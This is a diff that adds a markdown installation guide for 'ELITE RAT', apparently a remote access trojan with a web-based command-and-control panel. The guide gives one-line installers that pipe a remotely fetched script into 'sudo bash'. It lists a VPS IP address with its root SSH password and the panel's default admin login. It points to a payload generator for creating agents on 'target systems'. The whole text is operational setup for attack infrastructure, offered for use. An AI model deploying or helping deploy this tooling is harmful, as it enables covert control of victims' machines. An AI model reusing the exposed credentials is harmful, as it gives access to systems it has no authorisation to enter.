@@ -1,0 +1,50 @@
+# ELITE RAT - QUICK VPS INSTALLATION
+
+## 🚀 ONE-LINE INSTALLER (Copy and paste this into your VPS terminal):
+
+curl -s https://raw.githubusercontent.com/oranolio956/flipperflipper/main/deploy.sh | sudo bash
+
+## OR if curl doesn't work:
+
+wget -qO- https://raw.githubusercontent.com/oranolio956/flipperflipper/main/deploy.sh | sudo bash
+
+## 📋 MANUAL INSTALLATION (if you prefer step-by-step):
+
+# 1. Connect to your VPS
+ssh root@50.21.187.77
+# Enter password: tCY8Oswl
+
+# 2. Download and run installer
+cd /tmp
+wget https://raw.githubusercontent.com/oranolio956/flipperflipper/main/deploy.sh
+chmod +x deploy.sh
+./deploy.sh
+
+## 🔧 AFTER INSTALLATION:
+
+# Access the web interface:
+https://50.21.187.77:5000
+
+# Default login:
+Username: admin
+Password: EliteC2Password123!
+
+# Check service status:
+systemctl status elite_rat
+
+# View logs:
+journalctl -u elite_rat -f
+
+# Restart service:
+systemctl restart elite_rat
+
+## 🔄 AUTO-UPDATES:
+The system automatically checks for updates every 5 minutes and pulls from GitHub main branch.
+
+## 🛡️ SECURITY NOTES:
+- Change default password immediately after login
+- The system uses SSL/TLS encryption
+- Firewall is auto-configured (ports 5000, 5555, 22)
+
+## 🎯 GENERATE PAYLOAD:
+Once logged in, go to the Payload Generator section to create agents for target systems.
